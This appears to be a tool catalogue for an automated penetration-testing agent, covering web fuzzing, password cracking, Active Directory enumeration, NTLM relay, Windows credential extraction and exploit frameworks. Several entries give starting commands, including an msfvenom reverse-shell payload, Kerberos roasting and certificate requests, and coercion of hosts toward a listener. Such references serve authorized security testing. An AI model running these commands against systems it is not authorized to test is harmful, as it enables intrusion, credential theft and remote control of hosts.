guidance.rule: Pick the smallest tool that fits the observed attack surface. Run '<tool> -h' before unfamiliar use. Use knowledge_search with the tool name for detailed syntax.
guidance.long_running: Commands run under the mission command timeout; save output to files when results need later inspection.

categories.title: Web discovery, fuzzing, and vulnerability checks
categories.when: Use when the target exposes HTTP/HTTPS, APIs, parameters, directories, virtual hosts, known products, or reflected input.

tools.name: nmap
tools.purpose: Port scanning, service/version detection, OS hints, and NSE enumeration.
tools.notes: Avoid full port scans when the mission already gives a precise URL/port unless there is evidence of more services.

tools.name: fscan
tools.purpose: Fast intranet host, port, service, and weak credential discovery.
tools.notes: Use for internal network ranges after pivoting or when multiple private IPs are discovered.

tools.name: ffuf
tools.purpose: High-speed directory, file, parameter, API, and virtual-host fuzzing.
tools.notes: Establish baseline filters such as -fs, -fw, -fc, or -mc when response sizes/statuses need normalization. Prefer verified in-sandbox wordlist paths from env-info.

tools.name: arjun
tools.purpose: Discover hidden HTTP parameters and undocumented request fields.
tools.notes: Good after finding an endpoint with missing behavior or IDOR-like input.

tools.name: nuclei
tools.purpose: Template-based vulnerability, exposure, and misconfiguration detection.
tools.notes: Use findings as leads; verify manually before relying on them.

tools.name: wpscan
tools.purpose: Focused WordPress core, plugin, theme, and user enumeration.
tools.notes: Use immediately after WordPress is fingerprinted. Keep enumeration small first; verify vulnerable plugins manually before exploitation.

tools.name: sqlmap
tools.purpose: SQL injection detection, exploitation, database enumeration, and dump automation.
tools.notes: Use a captured request file when cookies, POST bodies, or custom headers matter.

tools.name: dalfox
tools.purpose: Find and validate reflected, stored, and parameter-based XSS.
tools.notes: Confirm exploitable output manually; use with collected URLs and parameters.

tools.name: searchsploit
tools.purpose: Search the local Exploit-DB mirror for known product/version exploits.
tools.notes: Use after fingerprinting product and version; prefer reading exploit source before running.

categories.title: Credentials, password attacks, and token testing
categories.when: Use when credentials, hashes, JWTs, login forms, Kerberos users, or password spraying opportunities are discovered.

tools.name: hydra
tools.purpose: Online authentication brute force and password spraying across many protocols.
tools.notes: Use carefully with small lists and clear failure markers to avoid wasting rounds.

tools.name: hashcat
tools.purpose: Offline hash cracking with many hash modes.
tools.notes: Identify the hash mode first; use rockyou or focused wordlists before mask attacks.

tools.name: john
tools.purpose: Offline password/hash cracking with auto-detection, format-specific modes, and companion conversion tools.
tools.notes: Use *2john converters when the artifact is an archive, SSH key, Kerberos material, or document rather than a raw hash.

tools.name: jwt_tool
tools.purpose: Decode, tamper, test, and crack JWT tokens.
tools.notes: Use after decoding claims and identifying alg/kid/jku/x5u or weak HS secrets.

tools.name: kerbrute
tools.purpose: Kerberos user enumeration and password spraying.
tools.notes: Prefer userenum before spraying; keep lockout risk in mind for authorized ranges.

tools.name: smartbrute
tools.purpose: Source tree for smart password spraying/bruteforce workflows.
tools.notes: Source-only helper; inspect README/help before use.

categories.title: Active Directory, Kerberos, LDAP, and SMB enumeration
categories.when: Use when a Windows domain, SMB, LDAP, Kerberos, domain credentials, or internal Windows hosts are discovered.

tools.name: netexec
tools.purpose: Enumerate and manage SMB/LDAP/WinRM/MSSQL/SSH services and AD environments.
tools.notes: Use for quick domain/service posture and credential validation.

tools.name: smbmap
tools.purpose: Enumerate SMB shares, permissions, and accessible files.
tools.notes: Use before recursive downloads; capture readable shares and interesting files.

tools.name: ldapdomaindump
tools.purpose: Dump LDAP domain users, groups, computers, ACL-related data, and trusts.
tools.notes: Good after obtaining valid domain credentials.

tools.name: powerview
tools.purpose: Python PowerView-style AD enumeration for users, groups, ACLs, computers, and trusts.
tools.notes: Use when LDAP/AD object relationships matter.

tools.name: asreproast
tools.purpose: Find AS-REP roastable users and request crackable Kerberos material.
first_commands: asreproast DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.hashes
tools.notes: Crack returned hashes with hashcat mode 18200.

tools.name: kerberoast
tools.purpose: Enumerate SPNs and request Kerberoast hashes.
tools.notes: Crack returned hashes with the hashcat mode indicated by the hash format.

tools.name: certipy-ad
tools.purpose: ADCS enumeration and exploitation.
first_commands: certipy-ad req -u USER@DOMAIN -p PASS -ca CA_NAME -template TEMPLATE -dc-ip DC_IP
tools.notes: Use for ESC templates, enrollment agents, relay to ADCS, and certificate authentication.

tools.name: SharpHound
tools.purpose: Windows AD graph collector for BloodHound.
tools.notes: Windows-native/source tool; transfer/build/use on a Windows host when needed.

tools.name: BloodHound
tools.purpose: AD attack path analysis and/or Python data collector.
tools.notes: Use BloodHound GUI where available; use bloodhound-python for collection from Linux.

categories.title: NTLM relay, coercion, and ADCS relay chains
categories.when: Use when NTLM relay, ADCS web enrollment, IPv6 poisoning, EFSRPC/MS-RPRN coercion, or machine account abuse is in scope.
examples: coercer coerce -u USER -p PASS -d DOMAIN -l LISTENER -t TARGET

tools.name: impacket-ntlmrelayx
tools.purpose: NTLM relay to SMB/LDAP/HTTP/ADCS targets.
tools.notes: Pair with coercion tools or mitm6; verify SMB signing and relay target viability.

tools.name: mitm6
tools.purpose: IPv6 DNS poisoning to capture or relay Windows authentication.
tools.notes: Usually paired with ntlmrelayx; scope carefully.

tools.name: coercer
tools.purpose: Coerce Windows hosts to authenticate to a listener using multiple RPC methods.
first_commands: coercer scan -u USER -p PASS -d DOMAIN -t TARGET
coercer coerce -u USER -p PASS -d DOMAIN -l LISTENER -t TARGET
tools.notes: Use to trigger relay paths after setting up ntlmrelayx.

tools.name: PetitPotam
tools.purpose: EFSRPC coercion for NTLM relay chains.
tools.notes: Wrapper enters /opt/ad-tools/PetitPotam and runs PetitPotam.py.

tools.name: PrinterBug
tools.purpose: MS-RPRN printer bug coercion.
tools.notes: Wrapper runs the krbrelayx printerbug script.

tools.name: krbrelayx
tools.purpose: Kerberos/LDAP relay helper scripts.
tools.notes: Inspect the source tree for additional helper scripts.

tools.name: DFSCoerce
tools.purpose: DFS namespace coercion script/source tree.
tools.notes: Source-only helper; run from its directory.

tools.name: ShadowCoerce
tools.purpose: Shadow copy related coercion script/source tree.
tools.notes: Source-only helper; run from its directory.

tools.name: PrivExchange
tools.purpose: Exchange-related forced authentication and relay helper.
tools.notes: Wrapper runs privexchange.py from /opt/ad-tools/PrivExchange.

categories.title: Windows-native tools and transferable sources
categories.when: Use when Windows execution, credential extraction, DPAPI, ticket handling, ADCS Windows tooling, or BloodHound collection is needed.

tools.name: mimikatz
tools.purpose: Windows credential extraction and ticket operations.
tools.notes: Windows-native binary; transfer only after obtaining authorized Windows execution.

tools.name: Rubeus
tools.purpose: Kerberos TGT/TGS, Kerberoast, S4U, PTT, and ticket operations on Windows.
tools.notes: Windows-native/source tool; build or transfer where appropriate.

tools.name: SharpDPAPI
tools.purpose: DPAPI credential extraction and analysis on Windows.
tools.notes: Windows-native/source tool.

tools.name: Certify
tools.purpose: Windows ADCS enumeration and exploitation.
tools.notes: Use Certipy from Linux first; use Certify when Windows execution is available.

tools.name: AdFind
tools.purpose: Windows AD LDAP query and ACL enumeration utility.
tools.notes: Likely replacement for requested dFind; Windows-native.

tools.name: StreamDivert
tools.purpose: Windows traffic redirection/diversion helper.
tools.notes: Windows-native/source tool; inspect README before use.

categories.title: Cloud, container, dependency, and Kubernetes auditing
categories.when: Use when cloud credentials, container images, Kubernetes endpoints, manifests, or filesystem dependency risk are discovered.

tools.name: prowler
tools.purpose: Cloud security auditing for AWS, Azure, GCP, and Kubernetes.
tools.notes: Requires valid cloud credentials or environment configuration.

tools.name: trivy
tools.purpose: Scan container images, filesystems, IaC, and dependencies for vulnerabilities and secrets.
tools.notes: Use after finding source code, Dockerfiles, manifests, or image names.

tools.name: kube-hunter
tools.purpose: Kubernetes cluster exposure and weakness discovery.
tools.notes: Use only when Kubernetes targets are in authorized scope.

categories.title: Packet capture and protocol analysis
categories.when: Use when traffic evidence, protocol debugging, credentials in transit, or pcap analysis matters.

tools.name: tshark
tools.purpose: CLI packet capture and protocol analysis.
first_commands: tshark -r capture.pcap -Y 'http || dns || kerberos || ldap || smb2'
tools.notes: Prefer tshark in containers; Wireshark GUI may not be practical.

tools.name: wireshark
tools.purpose: GUI packet analysis when display forwarding is available.
tools.notes: Usually use tshark instead inside the sandbox.

categories.title: Exploit frameworks, payloads, deserialization, and local privesc enumeration
categories.when: Use after confirming a vulnerable service, exploit module, deserialization sink, or local shell.

tools.name: Metasploit Framework
tools.purpose: Modular exploit, payload, scanner, and post-exploitation framework.
first_commands: msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf
tools.notes: Use non-interactive -x scripts because sandbox commands are non-interactive.

tools.name: ysoserial
tools.purpose: Generate Java deserialization payloads.
tools.notes: Understand whether output execution is local payload generation or remote target execution.

tools.name: linpeas
tools.purpose: Linux local privilege escalation enumeration script.
tools.notes: Run on a compromised Linux target, not just in the sandbox, unless analyzing local sandbox only.

tools.name: Darksteel
tools.purpose: Domain automation information gathering and exploitation source tree.
tools.notes: Inspect README/help before use; source-only wrapper may vary by upstream.
